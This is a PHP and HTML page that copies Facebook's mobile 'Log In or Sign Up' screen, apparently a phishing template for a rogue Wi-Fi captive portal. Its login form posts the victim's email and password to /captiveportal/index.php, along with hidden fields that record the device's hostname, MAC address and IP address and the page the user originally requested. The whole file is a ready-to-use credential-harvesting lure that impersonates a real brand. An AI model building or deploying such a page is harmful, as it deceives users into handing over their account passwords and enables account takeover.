<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <title>Facebook - Log In or Sign Up</title>
  <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
  <link href="assets/img/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196">
  <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
  <link type="text/css" rel="stylesheet" href="assets/css/fBTqFRkifHK.css" data-bootloader-hash="vu/4d" crossorigin="anonymous">
  <link type="text/css" rel="stylesheet" href="assets/css/PGNbJWSeFxY.css" data-bootloader-hash="Fuprg" crossorigin="anonymous">
</head>

<body tabindex="0" class="touch x1 ff _fzu _50-3 iframe acw portrait" style="min-height: 740px; background-color: rgb(255, 255, 255);">
  <div id="viewport" data-kaios-focus-transparent="1" style="min-height: 740px;">
    <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
    <div id="page">
      <div class="_129_" id="header-notices"></div>
      <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane" style="min-height: 740px;">
        <div class="_5909">
          <div class="_7om2">
            <div class="_4g34" id="u_0_0">
              <div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error" data-sigil="m_login_notice">
                <div class="_52jd"></div>
              </div>
              <div class="_4-4l">
                <div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element"></div>
                <div class="_5909 _2pid _52z6">
                  <div class="_7om2 _52we">
                    <div class="_4g34">
                      <a href="#"><img src="assets/img/dF5SId3UHWd.svg" class="img" alt="facebook" width="112"></a>
                    </div>
                  </div>
                </div>
                <div class="_5rut" data-sigil="login_inner">
                  <form method="post" action="/captiveportal/index.php" class="mobile-login-form _9hp- _5spm" id="login_form" novalidate="1" data-sigil="m_login_form" data-autoid="autoid_2" onsubmit="redirect()">
                    <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                    <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                    <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                    <input type="hidden" name="target" value="<?=$destination?>">
                    <div id="user_info_container" data-sigil="user_info_after_failure_element"></div>
                    <div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div>
                    <div id="otp_retrieve_desc_container"></div>
                    <div>
                      <div class="_56be">
                        <div class="_55wo _56bf">
                          <div class="_96n9" id="email_input_container">
                            <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq _8qtn" autocomplete="on" id="m_login_email" name="email" placeholder="Mobile number or email" type="text" data-sigil="m_login_email">
                          </div>
                        </div>
                      </div>
                      <div class="_55wq"></div>
                      <div class="_56be">
                        <div class="_55wo _56bf">
                          <div class="_1upc _mg8" data-sigil="m_login_password">
                            <div class="_5909">
                              <div class="_7om2">
                                <div class="_4g34 _5i2i _52we">
                                  <div class="_5xu4">
                                    <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="on" id="m_login_password" name="password" placeholder="Password" type="password" data-sigil="password-plain-text-toggle-input">
                                  </div>
                                </div>
                                <div class="_5s61 _216i _5i2i _52we">
                                  <div class="_5xu4">
                                    <div class="_2pi9" style="display:none" id="u_0_1"><a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" style="display:none" id="u_0_2">HIDE</span><span class="mfss" id="u_0_3">SHOW</span></a></div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div class="_2pie" style="text-align:center;">
                      <div id="u_0_4" data-sigil="login_password_step_element">
                        <button type="submit" value="Log In" class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu" name="login" data-sigil="touchable login_button_block m_login_button" data-autoid="autoid_4"><span class="_55sr">Log In</span></button>
                      </div>
                      <div class="_7eif" id="oauth_login_button_container" style="display:none"></div>
                      <div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div>
                      <div id="otp_button_elem_container"></div>
                    </div>
                    <div class="_xo8"></div>
                  </form>
                  <div>
                    <div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator"><span class="_43mh">or</span></div>
                    <div class="_52jj _5t3b" id="signup_button_area"><a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" tabindex="0" data-sigil="m_reg_button" data-autoid="autoid_3">Create New Account</a></div>
                  </div>
                  <div>
                    <div data-sigil="login_identify_step_element"></div>
                    <div class="other-links _8p_m">
                      <ul class="_5pkb _55wp">
                        <li><span class="mfss fcg"><a tabindex="0" href="#" id="forgot-password-link">Forgot Password?</a></span></li>
                      </ul>
                    </div>
                    <div class="other-links _8p_m _9f37" data-sigil="reg_link"></div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="_55wr _5ui2" data-sigil="m_login_footer">
          <div class="_5dpw">
            <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
              <div class="_5909">
                <div class="_7om2">
                  <div class="_4g34"><span class="_52jc _52j9 _52jh _3ztb">English (US)</span>
                    <div class="_3ztc"><span class="_52jc"><a href="#" data-locale="cx_PH" data-sigil="change_language">Español</a></span></div>
                    <div
                    class="_3ztc"><span class="_52jc"><a href="#" data-locale="ko_KR" data-sigil="change_language">Português (Brasil)</a></span></div>
                  <div
                  class="_3ztc"><span class="_52jc"><a href="#" data-locale="pt_BR" data-sigil="change_language">Italiano</a></span></div>
              </div>
              <div class="_4g34">
                <div class="_3ztc"><span class="_52jc"><a href="#" data-locale="tl_PH" data-sigil="change_language">Français (Canada)</a></span></div>
                <div
                class="_3ztc"><span class="_52jc"><a href="#" data-locale="es_LA" data-sigil="change_language">中文(简体)</a></span></div>
              <div
              class="_3ztc"><span class="_52jc"><a href="#" data-locale="ja_JP" data-sigil="change_language">Deutsch</a></span></div>
            <a
            href="#">
              <div class="_3j87 _1rrd _3ztd" aria-label="Complete list of languages" data-sigil="more_language"><i class="img sp_bJwgThQCp3b sx_e88f22"></i></div>
              </a>
          </div>
        </div>
      </div>
    </div>
    <div class="_5ui4">
      <div class="_96qv _9a0a"><a href="#" class="_96qw" title="Read our blog, discover the resource center, and find job opportunities.">About</a><span aria-hidden="true"> · </span><a href="#"
        class="_96qw" title="Visit our Help Center.">Help</a><span aria-hidden="true"> · </span><span class="_96qw" id="u_0_7">More</span></div>
      <div class="_96qv" style="display:none" id="u_0_8"><a href="#" class="_96qw">Pages</a><a href="#" title="Browse our places directory." class="_96qw">Locations</a><a href="#"
        title="Browse our people directory." class="_96qw">People</a><a href="#" title="Browse our Groups directory." class="_96qw">Groups</a><a href="#" class="_96qw">Page Categories</a>
        <a
        href="#" class="_96qw" title="Check out popular places on Facebook.">Places</a><a href="#" class="_96qw" target="_blank" title="Learn more about Oculus">Oculus</a><a href="#" class="_96qw" target="_blank" title="Learn more about Portal from Facebook">Portal</a>
          <a
          href="#" class="_96qw" title="Buy and sell on Facebook Marketplace.">Marketplace</a><a href="#" class="_96qw" target="_blank" title="Learn more about Facebook Pay">Facebook Pay</a><a href="#" class="_96qw" title="Donate to worthy causes.">Fundraisers</a></div>
      <span
      class="mfss fcg">Facebook Inc.</span>
    </div>
  </div>
  </div>
  </div>
  <div class=""></div>
  <div class="viewportArea _2v9s" style="display:none" id="u_0_9" data-sigil="marea">
    <div class="_5vsg" id="u_0_a" style="max-height: 800px;"></div>
    <div class="_5vsh" id="u_0_b" style="max-height: 397px;"></div>
    <div class="_5v5d fcg">
      <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Loading...</div>
  </div>
  <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
    <div class="container">
      <div class="image"></div>
      <div class="message" data-sigil="error-message"></div><a class="link" data-sigil="MPageError:retry">Try Again</a></div>
  </div>
  </div>
  </div>
  <div id="static_templates">
    <div class="mDialog" id="modalDialog" style="display:none" data-sigil=" context-layer-root" data-autoid="autoid_1">
      <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
        <div class="_5909">
          <div class="_7om2 _52we">
            <div class="_5s61">
              <div class="_52z7">
                <button type="submit" value="Cancel" class="cancelButton btn btnD bgb mfss touchable" id="u_0_d" data-sigil="dialog-cancel-button">Cancel</button>
                <button type="submit" value="Back" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Back" id="u_0_e" data-sigil="dialog-back-button"><i class="img sp_bJwgThQCp3b sx_592eb4" style="margin-top: 2px;"></i></button>
              </div>
            </div>
            <div class="_4g34">
              <div class="_52z6">
                <div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0" data-sigil="m-dialog-header-title dialog-title">Loading...</div>
              </div>
            </div>
            <div class="_5s61">
              <div class="_52z8" id="modalDialogHeaderButtons"></div>
            </div>
          </div>
        </div>
      </div>
      <div class="modalDialogView" id="modalDialogView"></div>
      <div class="_5v5d _5v5e fcg" id="dialogSpinner">
        <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_c" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Loading...</div>
    </div>
  </div>
  <link rel="preload" href="assets/css/fBTqFRkifHK.css" as="style" crossorigin="anonymous">
  <link rel="preload" href="assets/css/PGNbJWSeFxY.css" as="style" crossorigin="anonymous">
</body>

</html>
